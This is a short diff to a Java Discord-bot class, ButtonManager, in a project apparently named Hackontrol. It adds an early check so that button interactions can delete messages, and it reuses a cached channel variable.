@@ -7,6 +7,7 @@ import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.registry.TypeEntry;
 import com.khopan.hackontrol.utils.MultiConsumer;
+import com.khopan.hackontrol.utils.interaction.HackontrolButton;
 
 import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
@@ -58,12 +59,19 @@ public final class ButtonManager {
 	@SuppressWarnings("unchecked")
 	static void buttonEvent(ButtonInteractionEvent Event) {
 		String identifier = Event.getButton().getId();
+		long originalMessage = Event.getMessageIdLong();
+		TextChannel channel = (TextChannel) Event.getChannel();
+
+		if(HackontrolButton.deleteMessages(identifier, originalMessage, channel)) {
+			return;
+		}
+
 		InteractionSession session = InteractionSession.decodeSession(identifier);
 		Hackontrol.LOGGER.info("Processing button: {}", identifier);
 		MultiConsumer<ButtonContext> consumer = new MultiConsumer<>();
 
 		if(session == null) {
-			HackontrolChannel hackontrolChannel = Hackontrol.getInstance().getChannel((TextChannel) Event.getChannel());
+			HackontrolChannel hackontrolChannel = Hackontrol.getInstance().getChannel(channel);
 			List<TypeEntry<Button, Consumer<ButtonContext>>> buttonList = InteractionManager.BUTTON_REGISTRY.list(hackontrolChannel);
 
 			for(int i = 0; i < buttonList.size(); i++) {
